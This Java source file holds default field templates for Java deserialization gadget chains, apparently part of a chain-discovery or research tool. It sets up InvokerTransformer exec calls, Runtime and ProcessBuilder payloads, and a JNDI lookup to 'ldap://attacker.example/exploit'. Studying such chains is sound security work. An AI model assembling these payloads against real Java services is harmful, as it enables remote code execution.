package iocd;

import com.google.gson.*;
import java.util.*;

/**
 * Known field override templates for gadget classes.
 * Ported from Python's deser_constraints._DEFAULT_OVERRIDES.
 *
 * These provide sensible default field values when emitting IR JSON
 * for discovered chains. Unknown classes get minimal overrides
 * (bridge field $ref only).
 */
public class FieldOverrideTemplates {

    /**
     * Get default field overrides for a class.
     * Bridge fields are populated with $ref pointers based on bridgeLinks map.
     *
     * @param className FQCN of the gadget class
     * @param bridgeLinks fieldName → link index for bridge $ref pointers
     * @return JsonObject of field_overrides, or empty object if unknown
     */
    public static JsonObject getOverrides(String className, Map<String, Integer> bridgeLinks) {
        JsonObject overrides = new JsonObject();

        // Apply known template if exists
        Template tmpl = TEMPLATES.get(className);
        if (tmpl != null) {
            for (var entry : tmpl.fields.entrySet()) {
                String fieldName = entry.getKey();
                Object value = entry.getValue();

                // Check if this field should be a bridge $ref
                if (bridgeLinks.containsKey(fieldName)) {
                    overrides.add(fieldName, makeRef(bridgeLinks.get(fieldName)));
                } else if (value instanceof RefPlaceholder) {
                    // Template has a $ref placeholder — use bridge link if available
                    // otherwise use the placeholder's default index
                    int idx = ((RefPlaceholder) value).defaultIndex;
                    overrides.add(fieldName, makeRef(idx));
                } else {
                    overrides.add(fieldName, toJsonElement(value));
                }
            }
        }

        // Ensure all bridge links are present (even if no template)
        for (var entry : bridgeLinks.entrySet()) {
            if (!overrides.has(entry.getKey())) {
                overrides.add(entry.getKey(), makeRef(entry.getValue()));
            }
        }

        return overrides;
    }

    // ── Template definitions ─────────────────────────────────────

    private static class RefPlaceholder {
        final int defaultIndex;
        RefPlaceholder(int idx) { this.defaultIndex = idx; }
    }

    private static class Template {
        final Map<String, Object> fields = new LinkedHashMap<>();
        Template put(String name, Object value) { fields.put(name, value); return this; }
        Template ref(String name, int idx) { fields.put(name, new RefPlaceholder(idx)); return this; }
    }

    private static final Map<String, Template> TEMPLATES = new LinkedHashMap<>();
    static {
        // ── CC3 Transformers ──
        TEMPLATES.put("org.apache.commons.collections.functors.InvokerTransformer",
            new Template()
                .put("iMethodName", "exec")
                .put("iParamTypes", new String[]{"[Ljava.lang.String;"})
                .put("iArgs", new Object[]{new String[]{"id"}}));

        TEMPLATES.put("org.apache.commons.collections.functors.ConstantTransformer",
            new Template().put("iConstant", "java.lang.Runtime"));

        TEMPLATES.put("org.apache.commons.collections.functors.ChainedTransformer",
            new Template().put("iTransformers", new Object[0]));

        TEMPLATES.put("org.apache.commons.collections.functors.InstantiateTransformer",
            new Template()
                .put("iParamTypes", new String[]{"[Ljava.lang.String;"})
                .put("iArgs", new Object[]{new String[]{"id"}}));

        TEMPLATES.put("org.apache.commons.collections.map.LazyMap",
            new Template().put("map", new Object[0]).ref("factory", 1));

        TEMPLATES.put("org.apache.commons.collections.keyvalue.TiedMapEntry",
            new Template().ref("map", 1).put("key", "trigger"));

        TEMPLATES.put("org.apache.commons.collections.map.TransformedMap",
            new Template().ref("valueTransformer", 1).put("map", new Object[0]));

        // ── CC4 Transformers ──
        TEMPLATES.put("org.apache.commons.collections4.functors.InvokerTransformer",
            new Template()
                .put("iMethodName", "exec")
                .put("iParamTypes", new String[]{"[Ljava.lang.String;"})
                .put("iArgs", new Object[]{new String[]{"id"}}));

        TEMPLATES.put("org.apache.commons.collections4.functors.ConstantTransformer",
            new Template().put("iConstant", "java.lang.Runtime"));

        TEMPLATES.put("org.apache.commons.collections4.functors.ChainedTransformer",
            new Template().put("iTransformers", new Object[0]));

        TEMPLATES.put("org.apache.commons.collections4.comparators.TransformingComparator",
            new Template().ref("transformer", 1));

        TEMPLATES.put("org.apache.commons.collections4.map.LazyMap",
            new Template().put("map", new Object[0]).ref("factory", 1));

        TEMPLATES.put("org.apache.commons.collections4.keyvalue.TiedMapEntry",
            new Template().ref("map", 1).put("key", "trigger"));

        // ── BeanUtils ──
        TEMPLATES.put("org.apache.commons.beanutils.BeanComparator",
            new Template().put("property", "outputProperties"));

        // ── ROME ──
        TEMPLATES.put("com.sun.syndication.feed.impl.ToStringBean",
            new Template()
                .put("_beanClass", "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl")
                .ref("_obj", 1));

        TEMPLATES.put("com.sun.syndication.feed.impl.EqualsBean",
            new Template()
                .put("_beanClass", "com.sun.syndication.feed.impl.ToStringBean")
                .ref("_obj", 1));

        TEMPLATES.put("com.sun.syndication.feed.impl.ObjectBean",
            new Template()
                .ref("_equalsBean", 0)
                .ref("_toStringBean", 1));

        // ── Groovy ──
        TEMPLATES.put("org.codehaus.groovy.runtime.MethodClosure",
            new Template()
                .put("owner", "id")
                .put("delegate", "id")
                .put("method", "execute")
                .put("maximumNumberOfParameters", 0)
                .put("parameterTypes", new Object[0]));

        TEMPLATES.put("org.codehaus.groovy.runtime.GStringImpl",
            new Template()
                .put("strings", new String[]{"", ""}));

        // ── Hibernate ──
        TEMPLATES.put("org.hibernate.engine.spi.TypedValue",
            new Template().ref("type", 1).ref("value", 2));

        TEMPLATES.put("org.hibernate.type.ComponentType",
            new Template().put("propertySpan", 1));

        TEMPLATES.put("org.hibernate.property.access.spi.GetterMethodImpl",
            new Template()
                .put("containerClass", "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl")
                .put("propertyName", "outputProperties"));

        // ── Vaadin ──
        TEMPLATES.put("com.vaadin.data.util.MethodProperty",
            new Template()
                .ref("instance", 1)
                .put("getMethodName", "getOutputProperties")
                .put("type", "java.util.Properties"));

        TEMPLATES.put("com.vaadin.data.util.NestedMethodProperty",
            new Template()
                .ref("instance", 1)
                .put("propertyName", "outputProperties"));

        // ── JDK Sinks ──
        TEMPLATES.put("com.sun.rowset.JdbcRowSetImpl",
            new Template().put("dataSource", "ldap://attacker.example/exploit"));

        TEMPLATES.put("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
            new Template().put("_name", "exploit"));

        // ── InvocationHandlers ──
        TEMPLATES.put("java.beans.EventHandler",
            new Template().ref("target", 0).put("action", "exec"));

        TEMPLATES.put("bsh.XThis$Handler",
            new Template().ref("target", 0).put("action", "compare"));

        // ── BeanShell ──
        TEMPLATES.put("bsh.Interpreter",
            new Template().put("payload",
                "compare(Object a, Object b) {new java.lang.ProcessBuilder(new String[]{\"id\"}).start();return new Integer(1);}"));
    }

    // ── JSON helpers ─────────────────────────────────────────────

    private static JsonObject makeRef(int linkIndex) {
        JsonObject ref = new JsonObject();
        ref.addProperty("$ref", "link:" + linkIndex);
        return ref;
    }

    private static JsonElement toJsonElement(Object value) {
        if (value == null) return JsonNull.INSTANCE;
        if (value instanceof String) return new JsonPrimitive((String) value);
        if (value instanceof Number) return new JsonPrimitive((Number) value);
        if (value instanceof Boolean) return new JsonPrimitive((Boolean) value);
        if (value instanceof String[]) {
            JsonArray arr = new JsonArray();
            for (String s : (String[]) value) arr.add(s);
            return arr;
        }
        if (value instanceof Object[]) {
            JsonArray arr = new JsonArray();
            for (Object o : (Object[]) value) {
                arr.add(toJsonElement(o));
            }
            return arr;
        }
        if (value instanceof RefPlaceholder) {
            return makeRef(((RefPlaceholder) value).defaultIndex);
        }
        return new JsonPrimitive(value.toString());
    }
}
